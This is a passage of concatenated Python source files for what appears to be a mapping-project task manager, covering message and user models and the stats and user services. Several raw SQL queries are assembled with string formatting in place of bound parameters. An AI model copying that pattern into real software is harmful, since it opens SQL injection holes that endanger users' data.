that user was mentioned in a comment/chat\n    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated\n    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated\n\nclass Message(db.Model):\n    \"\"\" Describes an individual Message a user can send \"\"\"\n    __tablename__ = \"messages\"\n\n    __table_args__ = (\n        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),\n    )\n\n    id = db.Column(db.Integer, primary_key=True)\n    message = db.Column(db.String)\n    subject = db.Column(db.String)\n    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))\n    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)\n    task_id = db.Column(db.Integer, index=True)\n    message_type = db.Column(db.Integer, index=True)\n    date = db.Column(db.DateTime, default=timestamp)\n    read = db.Column(db.Boolean, default=False)\n\n    # Relationships\n    from_user = db.relationship(User, foreign_keys=[from_user_id])\n    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')\n    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')\n    task = db.relationship(Task, primaryjoin=\"and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)\",\n        backref='messages')\n\n    @classmethod\n    def from_dto(cls, to_user_id: int, dto: MessageDTO):\n        \"\"\" Creates new message from DTO \"\"\"\n        message = cls()\n        message.subject = dto.subject\n        message.message = dto.message\n        message.from_user_id = dto.from_user_id\n        message.to_user_id = to_user_id\n        message.project_id = dto.project_id\n        message.task_id = dto.task_id\n        if dto.message_type is not None:\n            message.message_type = MessageType(dto.message_type)\n\n        return message\n\n    def as_dto(self) -> MessageDTO:\n        \"\"\" Casts message object to DTO \"\"\"\n        dto = MessageDTO()\n        dto.message_id = self.id\n        dto.message = self.message\n        dto.sent_date = self.date\n        dto.read = self.read\n        dto.subject = self.subject\n        dto.project_id = self.project_id\n        dto.task_id = self.task_id\n        if self.message_type is not None:\n            dto.message_type = MessageType(self.message_type).name\n\n        if self.from_user_id:\n            dto.from_username = self.from_user.username\n\n        return dto\n\n    def add_message(self):\n        \"\"\" Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS\"\"\"\n        current_app.logger.debug('Adding message to session')\n        db.session.add(self)\n\n    def save(self):\n        \"\"\" Save \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    @staticmethod\n    def get_all_contributors(project_id: int):\n        \"\"\" Get all contributors to a project \"\"\"\n        query = '''SELECT mapped_by as contributors from tasks where project_id = {0} and  mapped_by is not null\n                   UNION\n                   SELECT validated_by from tasks where tasks.project_id = {0} and validated_by is not null'''.format(project_id)\n\n        contributors = db.engine.execute(query)\n        return contributors\n\n    def mark_as_read(self):\n        \"\"\" Mark the message in scope as Read \"\"\"\n        self.read = True\n        db.session.commit()\n\n    @staticmethod\n    def get_unread_message_count(user_id: int):\n        \"\"\" Get count of unread messages for user \"\"\"\n        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()\n\n    @staticmethod\n    def get_all_messages(user_id: int) -> MessagesDTO:\n        \"\"\" Gets all messages to the user \"\"\"\n        user_messages = Message.query.filter(Message.to_user_id == user_id).all()\n\n        if len(user_messages) == 0:\n            raise NotFound()\n\n        messages_dto = MessagesDTO()\n        for message in user_messages:\n            messages_dto.user_messages.append(message.as_dto())\n\n        return messages_dto\n\n    @staticmethod\n    def delete_multiple_messages(message_ids: list, user_id: int):\n        \"\"\" Deletes the specified messages to the user \"\"\"\n        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\\\n                delete(synchronize_session=False)\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n/n/n/n/server/models/postgis/user.py/n/nimport geojson\nimport datetime\nimport dateutil.parser\nfrom server import db\nfrom sqlalchemy import desc\nfrom server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \\\n    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser\nfrom server.models.postgis.licenses import License, users_licenses_table\nfrom server.models.postgis.project_info import ProjectInfo\nfrom server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole\nfrom server.models.postgis.utils import NotFound, timestamp\n\nclass User(db.Model):\n    \"\"\" Describes the history associated with a task \"\"\"\n    __tablename__ = \"users\"\n\n    id = db.Column(db.BigInteger, primary_key=True, index=True)\n    validation_message = db.Column(db.Boolean, default=True, nullable=False)\n    username = db.Column(db.String, unique=True)\n    role = db.Column(db.Integer, default=0, nullable=False)\n    mapping_level = db.Column(db.Integer, default=1, nullable=False)\n    projects_mapped = db.Column(db.Integer, default=1, nullable=False)\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\n    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)\n    projects_mapped = db.Column(db.ARRAY(db.Integer))\n    email_address = db.Column(db.String)\n    is_email_verified = db.Column(db.Boolean, default=False)\n    is_expert = db.Column(db.Boolean, default=False)\n    twitter_id = db.Column(db.String)\n    facebook_id = db.Column(db.String)\n    linkedin_id = db.Column(db.String)\n    date_registered = db.Column(db.DateTime, default=timestamp)\n    # Represents the date the user last had one of their tasks validated\n    last_validation_date = db.Column(db.DateTime, default=timestamp)\n\n    # Relationships\n    accepted_licenses = db.relationship(\"License\", secondary=users_licenses_table)\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def save(self):\n        db.session.commit()\n\n    def get_by_id(self, user_id: int):\n        \"\"\" Return the user for the specified id, or None if not found \"\"\"\n        return User.query.get(user_id)\n\n    def get_by_username(self, username: str):\n        \"\"\" Return the user for the specified username, or None if not found \"\"\"\n        return User.query.filter_by(username=username).one_or_none()\n\n    def update_username(self, username: str):\n        \"\"\" Update the username \"\"\"\n        self.username = username\n        db.session.commit()\n\n    def update(self, user_dto: UserDTO):\n        \"\"\" Update the user details \"\"\"\n        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None\n        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None\n        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None\n        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None\n        self.validation_message = user_dto.validation_message\n        db.session.commit()\n\n    def set_email_verified_status(self, is_verified: bool):\n        \"\"\" Updates email verfied flag on successfully verified emails\"\"\"\n        self.is_email_verified = is_verified\n        db.session.commit()\n\n    def set_is_expert(self, is_expert: bool):\n        \"\"\" Enables or disables expert mode on the user\"\"\"\n        self.is_expert = is_expert\n        db.session.commit()\n\n    @staticmethod\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Search and filter all users \"\"\"\n\n        # Base query that applies to all searches\n        base = db.session.query(User.id, User.username, User.mapping_level, User.role)\n\n        # Add filter to query as required\n        if query.mapping_level:\n            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)\n        if query.username:\n            base = base.filter(User.username.ilike(query.username.lower() + '%'))\n        if query.role:\n            base = base.filter(User.role == UserRole[query.role.upper()].value)\n\n        results = base.order_by(User.username).paginate(query.page, 20, True)\n\n        dto = UserSearchDTO()\n        for result in results.items:\n            listed_user = ListedUser()\n            listed_user.id = result.id\n            listed_user.mapping_level = MappingLevel(result.mapping_level).name\n            listed_user.username = result.username\n            listed_user.role = UserRole(result.role).name\n\n            dto.users.append(listed_user)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def get_all_users_not_pagainated():\n        \"\"\" Get all users in DB\"\"\"\n        return db.session.query(User.id).all()\n\n\n    @staticmethod\n    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Finds users that matches first characters, for auto-complete.\n\n        Users who have participated (mapped or validated) in the project, if given, will be\n        returned ahead of those who have not.\n        \"\"\"\n        # Note that the projects_mapped column includes both mapped and validated projects.\n        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(\"participant\")) \\\n            .filter(User.username.ilike(user_filter.lower() + '%')) \\\n            .order_by(desc(\"participant\").nullslast(), User.username).paginate(page, 20, True)\n        if results.total == 0:\n            raise NotFound()\n\n        dto = UserFilterDTO()\n        for result in results.items:\n            dto.usernames.append(result.username)\n            if project_id is not None:\n                participant = ProjectParticipantUser()\n                participant.username = result.username\n                participant.project_id = project_id\n                participant.is_participant = bool(result.participant)\n                dto.users.append(participant)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Adds projects to mapped_projects if it doesn't exist \"\"\"\n        sql = \"select * from users where id = {0} and projects_mapped @> '{{{1}}}'\".format(user_id, project_id)\n        result = db.engine.execute(sql)\n\n        if result.rowcount > 0:\n            return  # User has previously mapped this project so return\n\n        sql = '''update users\n                    set projects_mapped = array_append(projects_mapped, {0})\n                  where id = {1}'''.format(project_id, user_id)\n\n        db.engine.execute(sql)\n\n    @staticmethod\n    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:\n        \"\"\" Get all projects a user has mapped on \"\"\"\n\n        # This query looks scary, but we're really just creating an outer join between the query that gets the\n        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to\n        # handle cases where users have only validated tasks on a project, or only mapped on a project.\n        sql = '''SELECT p.id,\n                        p.status,\n                        p.default_locale,\n                        c.mapped,\n                        c.validated,\n                        st_asgeojson(p.centroid)\n                   FROM projects p,\n                        (SELECT coalesce(v.project_id, m.project_id) project_id,\n                                coalesce(v.validated, 0) validated,\n                                coalesce(m.mapped, 0) mapped\n                          FROM (SELECT t.project_id,\n                                       count (t.validated_by) validated\n                                  FROM tasks t\n                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\n                                   AND t.validated_by = {0}\n                                 GROUP BY t.project_id, t.validated_by) v\n                         FULL OUTER JOIN\n                        (SELECT t.project_id,\n                                count(t.mapped_by) mapped\n                           FROM tasks t\n                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\n                            AND t.mapped_by = {0}\n                          GROUP BY t.project_id, t.mapped_by) m\n                         ON v.project_id = m.project_id) c\n                   WHERE p.id = c.project_id ORDER BY p.id DESC'''.format(user_id)\n\n        results = db.engine.execute(sql)\n\n        if results.rowcount == 0:\n            raise NotFound()\n\n        mapped_projects_dto = UserMappedProjectsDTO()\n        for row in results:\n            mapped_project = MappedProject()\n            mapped_project.project_id = row[0]\n            mapped_project.status = ProjectStatus(row[1]).name\n            mapped_project.tasks_mapped = row[3]\n            mapped_project.tasks_validated = row[4]\n            mapped_project.centroid = geojson.loads(row[5])\n\n            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])\n            mapped_project.name = project_info.name\n\n            mapped_projects_dto.mapped_projects.append(mapped_project)\n\n        return mapped_projects_dto\n\n    def set_user_role(self, role: UserRole):\n        \"\"\" Sets the supplied role on the user \"\"\"\n        self.role = role.value\n        db.session.commit()\n\n    def set_mapping_level(self, level: MappingLevel):\n        \"\"\" Sets the supplied level on the user \"\"\"\n        self.mapping_level = level.value\n        db.session.commit()\n\n    def accept_license_terms(self, license_id: int):\n        \"\"\" Associate the user in scope with the supplied license \"\"\"\n        image_license = License.get_by_id(license_id)\n        self.accepted_licenses.append(image_license)\n        db.session.commit()\n\n    def has_user_accepted_licence(self, license_id: int):\n        \"\"\" Test to see if the user has accepted the terms of the specified license\"\"\"\n        image_license = License.get_by_id(license_id)\n\n        if image_license in self.accepted_licenses:\n            return True\n\n        return False\n\n    def delete(self):\n        \"\"\" Delete the user in scope from DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def as_dto(self, logged_in_username: str) -> UserDTO:\n        \"\"\" Create DTO object from user in scope \"\"\"\n        user_dto = UserDTO()\n        user_dto.id = self.id\n        user_dto.username = self.username\n        user_dto.role = UserRole(self.role).name\n        user_dto.mapping_level = MappingLevel(self.mapping_level).name\n        user_dto.is_expert = self.is_expert or False\n        user_dto.date_registered = str(self.date_registered)\n        try:\n            user_dto.projects_mapped = len(self.projects_mapped)\n        # Handle users that haven't touched a project yet.\n        except:\n            user_dto.projects_mapped = 0\n        user_dto.tasks_mapped = self.tasks_mapped\n        user_dto.tasks_validated = self.tasks_validated\n        user_dto.tasks_invalidated = self.tasks_invalidated\n        user_dto.twitter_id = self.twitter_id\n        user_dto.linkedin_id = self.linkedin_id\n        user_dto.facebook_id = self.facebook_id\n        user_dto.validation_message = self.validation_message\n        user_dto.total_time_spent = 0\n        user_dto.time_spent_mapping = 0\n        user_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = {0};\"\"\".format(self.id)\n        total_validation_time = db.engine.execute(sql)\n        for row in total_validation_time:\n            total_validation_time = row[0]\n            if total_validation_time:\n                total_validation_seconds = total_validation_time.total_seconds()\n                user_dto.time_spent_validating = total_validation_seconds\n                user_dto.total_time_spent += user_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = {0};\"\"\".format(self.id)\n        total_mapping_time = db.engine.execute(sql)\n        for row in total_mapping_time:\n            total_mapping_time = row[0]\n            if total_mapping_time:\n                total_mapping_seconds = total_mapping_time.total_seconds()\n                user_dto.time_spent_mapping = total_mapping_seconds\n                user_dto.total_time_spent += user_dto.time_spent_mapping\n\n        if self.username == logged_in_username:\n            # Only return email address when logged in user is looking at their own profile\n            user_dto.email_address = self.email_address\n            user_dto.is_email_verified = self.is_email_verified\n        return user_dto\n/n/n/n/server/services/stats_service.py/n/nfrom cachetools import TTLCache, cached\n\nfrom sqlalchemy import func, text\nfrom server import db\nfrom server.models.dtos.stats_dto import (\n    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,\n    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,\n    CampaignStatsDTO\n    )\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.statuses import TaskStatus\nfrom server.models.postgis.task import TaskHistory, User, Task\nfrom server.models.postgis.utils import timestamp, NotFound\nfrom server.services.project_service import ProjectService\nfrom server.services.users.user_service import UserService\n\n\nhomepage_stats_cache = TTLCache(maxsize=4, ttl=30)\n\n\nclass StatsService:\n\n    @staticmethod\n    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,\n                                             new_state: TaskStatus, action='change'):\n        \"\"\" Update stats when a task has had a state change \"\"\"\n\n        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:\n            return  # No stats to record for these states\n\n        project = ProjectService.get_project_by_id(project_id)\n        user = UserService.get_user_by_id(user_id)\n\n        StatsService._update_tasks_stats(project, user, last_state, new_state, action)\n        UserService.upsert_mapped_projects(user_id, project_id)\n        project.last_updated = timestamp()\n\n        # Transaction will be saved when task is saved\n        return project, user\n\n    @staticmethod\n    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,\n                            action='change'):\n\n        # Make sure you are aware that users table has it as incrementing counters,\n        # while projects table reflect the actual state, and both increment and decrement happens\n\n        # Set counters for new state\n        if new_state == TaskStatus.MAPPED:\n            project.tasks_mapped += 1\n        elif new_state == TaskStatus.VALIDATED:\n            project.tasks_validated += 1\n        elif new_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery += 1\n\n        if action == 'change':\n            if new_state == TaskStatus.MAPPED:\n                user.tasks_mapped += 1\n            elif new_state == TaskStatus.VALIDATED:\n                user.tasks_validated += 1\n            elif new_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated += 1\n\n        # Remove counters for old state\n        if last_state == TaskStatus.MAPPED:\n            project.tasks_mapped -= 1\n        elif last_state == TaskStatus.VALIDATED:\n            project.tasks_validated -= 1\n        elif last_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery -= 1\n\n        if action == 'undo':\n            if last_state == TaskStatus.MAPPED:\n                user.tasks_mapped -= 1\n            elif last_state == TaskStatus.VALIDATED:\n                user.tasks_validated -= 1\n            elif last_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated -= 1\n\n    @staticmethod\n    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:\n        \"\"\" Gets all the activity on a project \"\"\"\n\n        results = db.session.query(\n                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,\n                TaskHistory.action_text, User.username\n            ).join(User).filter(\n                TaskHistory.project_id == project_id,\n                TaskHistory.action != 'COMMENT'\n            ).order_by(\n                TaskHistory.action_date.desc()\n            ).paginate(page, 10, True)\n\n        if results.total == 0:\n            raise NotFound()\n\n        activity_dto = ProjectActivityDTO()\n        for item in results.items:\n            history = TaskHistoryDTO()\n            history.history_id = item.id\n            history.task_id = item.task_id\n            history.action = item.action\n            history.action_text = item.action_text\n            history.action_date = item.action_date\n            history.action_by = item.username\n            activity_dto.activity.append(history)\n\n        activity_dto.pagination = Pagination(results)\n        return activity_dto\n\n    @staticmethod\n    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:\n        \"\"\" Get all user contributions on a project\"\"\"\n        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated\n                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped\n                                     from tasks t,\n                                          users u\n                                    where t.mapped_by = u.id\n                                      and t.project_id = {0}\n                                      and t.mapped_by is not null\n                                    group by t.mapped_by, u.username) m FULL OUTER JOIN\n                                  (select t.validated_by, u.username, count(t.validated_by) validated\n                                     from tasks t,\n                                          users u\n                                    where t.validated_by = u.id\n                                      and t.project_id = {0}\n                                      and t.validated_by is not null\n                                    group by t.validated_by, u.username) v\n                                       ON m.mapped_by = v.validated_by\n        '''.format(project_id)\n\n        results = db.engine.execute(contrib_query)\n        if results.rowcount == 0:\n            raise NotFound()\n\n        contrib_dto = ProjectContributionsDTO()\n        for row in results:\n            user_id = row[0] or row[3]\n            user_contrib = UserContribution()\n            user_contrib.username = row[1] if row[1] else row[4]\n            user_contrib.mapped = row[2] if row[2] else 0\n            user_contrib.validated = row[5] if row[5] else 0\n            contrib_dto.user_contributions.append(user_contrib)\n        return contrib_dto\n\n    @staticmethod\n    @cached(homepage_stats_cache)\n    def get_homepage_stats() -> HomePageStatsDTO:\n        \"\"\" Get overall TM stats to give community a feel for progress that's being made \"\"\"\n        dto = HomePageStatsDTO()\n\n        dto.total_projects = Project.query.count()\n        dto.mappers_online = Task.query.filter(\n            Task.locked_by is not None\n            ).distinct(Task.locked_by).count()\n        dto.total_mappers = User.query.count()\n        dto.total_validators = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).distinct(Task.validated_by).count()\n        dto.tasks_mapped = Task.query.filter(\n            Task.task_status.in_(\n                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)\n                )\n            ).count()\n        dto.tasks_validated = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).count()\n\n        org_proj_count = db.session.query(\n            Project.organisation_tag,\n            func.count(Project.organisation_tag)\n        ).group_by(Project.organisation_tag).all()\n\n        untagged_count = 0\n\n        # total_area = 0\n\n\n\n       # dto.total_area = 0\n\n        # total_area_sql = \"\"\"select sum(ST_Area(geometry)) from public.projects as area\"\"\"\n\n        # total_area_result = db.engine.execute(total_area_sql)\n        # current_app.logger.debug(total_area_result)\n        # for rowproxy in total_area_result:\n            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]\n            # for tup in rowproxy.items():\n                # total_area += tup[1]\n                # current_app.logger.debug(total_area)\n        # dto.total_area = total_area\n\n        tasks_mapped_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)\n\n        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']\n\n        tasks_validated_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)\n\n        dto.total_validated_area = tasks_validated_result.fetchone()['sum']\n\n        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\\\n            .group_by(Project.campaign_tag).all()\n        no_campaign_count = 0\n        unique_campaigns = 0\n\n        for tup in campaign_count:\n            campaign_stats = CampaignStatsDTO(tup)\n            if campaign_stats.tag:\n                dto.campaigns.append(campaign_stats)\n                unique_campaigns += 1\n            else:\n                no_campaign_count += campaign_stats.projects_created\n\n        if no_campaign_count:\n            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))\n            dto.campaigns.append(no_campaign_proj)\n        dto.total_campaigns = unique_campaigns\n\n        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\\\n            .group_by(Project.organisation_tag).all()\n        no_org_count = 0\n        unique_orgs = 0\n\n        for tup in org_proj_count:\n            org_stats = OrganizationStatsDTO(tup)\n            if org_stats.tag:\n                dto.organizations.append(org_stats)\n                unique_orgs += 1\n            else:\n                no_org_count += org_stats.projects_created\n\n        if no_org_count:\n            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))\n            dto.organizations.append(no_org_proj)\n        dto.total_organizations = unique_orgs\n\n        return dto\n/n/n/n/server/services/users/user_service.py/n/nfrom cachetools import TTLCache, cached\nfrom flask import current_app\nfrom functools import reduce\nimport dateutil.parser\nimport datetime\n\nfrom server import db\nfrom server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \\\n    UserStatsDTO\nfrom server.models.dtos.message_dto import MessageDTO\nfrom server.models.postgis.message import Message\nfrom server.models.postgis.task import TaskHistory\nfrom server.models.postgis.user import User, UserRole, MappingLevel\nfrom server.models.postgis.utils import NotFound\nfrom server.services.users.osm_service import OSMService, OSMServiceError\nfrom server.services.messaging.smtp_service import SMTPService\nfrom server.services.messaging.template_service import get_template\n\nuser_filter_cache = TTLCache(maxsize=1024, ttl=600)\nuser_all_cache = TTLCache(maxsize=1024, ttl=600)\n\n\nclass UserServiceError(Exception):\n    \"\"\" Custom Exception to notify callers an error occurred when in the User Service \"\"\"\n\n    def __init__(self, message):\n        if current_app:\n            current_app.logger.error(message)\n\n\nclass UserService:\n    @staticmethod\n    def get_user_by_id(user_id: int) -> User:\n        user = User().get_by_id(user_id)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def get_user_by_username(username: str) -> User:\n        user = User().get_by_username(username)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def update_username(user_id: int, osm_username: str) -> User:\n        user = UserService.get_user_by_id(user_id)\n        if user.username != osm_username:\n            user.update_username(osm_username)\n\n        return user\n\n    @staticmethod\n    def register_user(osm_id, username, changeset_count):\n        \"\"\"\n        Creates user in DB\n        :param osm_id: Unique OSM user id\n        :param username: OSM Username\n        :param changeset_count: OSM changeset count\n        \"\"\"\n        new_user = User()\n        new_user.id = osm_id\n        new_user.username = username\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        if changeset_count > advanced_level:\n            new_user.mapping_level = MappingLevel.ADVANCED.value\n        elif intermediate_level < changeset_count < advanced_level:\n            new_user.mapping_level = MappingLevel.INTERMEDIATE.value\n        else:\n            new_user.mapping_level = MappingLevel.BEGINNER.value\n\n        new_user.create()\n        return new_user\n\n    @staticmethod\n    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied username \"\"\"\n        requested_user = UserService.get_user_by_username(requested_username)\n        logged_in_user = UserService.get_user_by_id(logged_in_user_id)\n        UserService.check_and_update_mapper_level(requested_user.id)\n\n        return requested_user.as_dto(logged_in_user.username)\n\n    @staticmethod\n    def get_user_dto_by_id(requested_user: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied user id \"\"\"\n        requested_user = UserService.get_user_by_id(requested_user)\n\n        return requested_user.as_dto(requested_user.username)\n\n    @staticmethod\n    def get_detailed_stats(username: str):\n        user = UserService.get_user_by_username(username)\n        stats_dto = UserStatsDTO()\n\n        actions = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text != ''\n        ).all()\n\n        tasks_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'MAPPED'\n        ).count()\n        tasks_validated = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'VALIDATED'\n        ).count()\n        projects_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action == 'STATE_CHANGE'\n        ).distinct(TaskHistory.project_id).count()\n\n        stats_dto.tasks_mapped = tasks_mapped\n        stats_dto.tasks_validated = tasks_validated\n        stats_dto.projects_mapped = projects_mapped\n        stats_dto.total_time_spent = 0\n        stats_dto.time_spent_mapping = 0\n        stats_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = {0};\"\"\".format(user.id)\n        total_validation_time = db.engine.execute(sql)\n        for time in total_validation_time:\n            total_validation_time = time[0]\n            if total_validation_time:\n                stats_dto.time_spent_validating = total_validation_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = {0};\"\"\".format(user.id)\n        total_mapping_time = db.engine.execute(sql)\n        for time in total_mapping_time:\n            total_mapping_time = time[0]\n            if total_mapping_time:\n                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_mapping\n\n        return stats_dto\n\n\n    @staticmethod\n    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:\n        \"\"\" Update user with info supplied by user, if they add or change their email address a verification mail\n            will be sent \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        verification_email_sent = False\n        if user_dto.email_address and user.email_address != user_dto.email_address.lower():\n            # Send user verification email if they are adding or changing their email address\n            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)\n            user.set_email_verified_status(is_verified=False)\n            verification_email_sent = True\n\n        user.update(user_dto)\n        return dict(verificationEmailSent=verification_email_sent)\n\n    @staticmethod\n    @cached(user_all_cache)\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Gets paginated list of users \"\"\"\n        return User.get_all_users(query)\n\n    @staticmethod\n    @cached(user_filter_cache)\n    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Gets paginated list of users, filtered by username, for autocomplete \"\"\"\n        return User.filter_users(username, project_id, page)\n\n    @staticmethod\n    def is_user_a_project_manager(user_id: int) -> bool:\n        \"\"\" Is the user a project manager \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def get_mapping_level(user_id: int):\n        \"\"\" Gets mapping level user is at\"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        return MappingLevel(user.mapping_level)\n\n    @staticmethod\n    def is_user_validator(user_id: int) -> bool:\n        \"\"\" Determines if user is a validator \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def is_user_blocked(user_id: int) -> bool:\n        \"\"\" Determines if a user is blocked \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) == UserRole.READ_ONLY:\n            return True\n\n        return False\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Add project to mapped projects if it doesn't exist, otherwise return \"\"\"\n        User.upsert_mapped_projects(user_id, project_id)\n\n    @staticmethod\n    def get_mapped_projects(user_name: str, preferred_locale: str):\n        \"\"\" Gets all projects a user has mapped or validated on \"\"\"\n        user = UserService.get_user_by_username(user_name)\n        return User.get_mapped_projects(user.id, preferred_locale)\n\n    @staticmethod\n    def add_role_to_user(admin_user_id: int, username: str, role: str):\n        \"\"\"\n        Add role to user\n        :param admin_user_id: ID of admin attempting to add the role\n        :param username: Username of user the role should be added to\n        :param role: The requested role\n        :raises UserServiceError\n        \"\"\"\n        try:\n            requested_role = UserRole[role.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')\n\n        admin = UserService.get_user_by_id(admin_user_id)\n        admin_role = UserRole(admin.role)\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:\n            raise UserServiceError(f'You must be an Admin to assign Admin role')\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:\n            raise UserServiceError(f'You must be an Admin to assign Project Manager role')\n\n        user = 